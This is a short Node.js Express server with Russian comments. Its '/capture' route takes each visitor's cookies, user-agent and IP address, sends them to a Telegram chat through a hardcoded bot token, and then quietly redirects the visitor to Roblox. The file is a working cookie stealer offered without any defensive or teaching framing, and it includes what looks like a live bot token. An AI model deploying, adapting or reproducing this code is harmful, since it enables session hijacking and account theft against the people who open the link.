const express = require('express');
const fetch = require('node-fetch');
const app = express();

const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM',
    TELEGRAM_CHAT_ID: '7695851744',
    REDIRECT_URL: 'https://www.roblox.com/'
};

app.get('/capture', async (req, res) => {
    try {
        const userCookies = req.headers.cookie || 'No cookies found';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const ip = req.ip || req.connection.remoteAddress;

        const messageText = `🔴 NEW COOKIES CAPTURED 🔴
        
📧 Cookies:
${userCookies}

🌐 User-Agent:
${userAgent}

📍 IP Address:
${ip}

⏰ Time: ${new Date().toLocaleString()}`;

        // Отправляем в Telegram
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: messageText,
                    parse_mode: 'HTML'
                })
            }
        );

        console.log('Telegram response status:', telegramResponse.status);

        // Редирект на Roblox
        res.redirect(CONFIG.REDIRECT_URL);
        
    } catch (error) {
        console.error('Error:', error);
        res.redirect(CONFIG.REDIRECT_URL);
    }
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});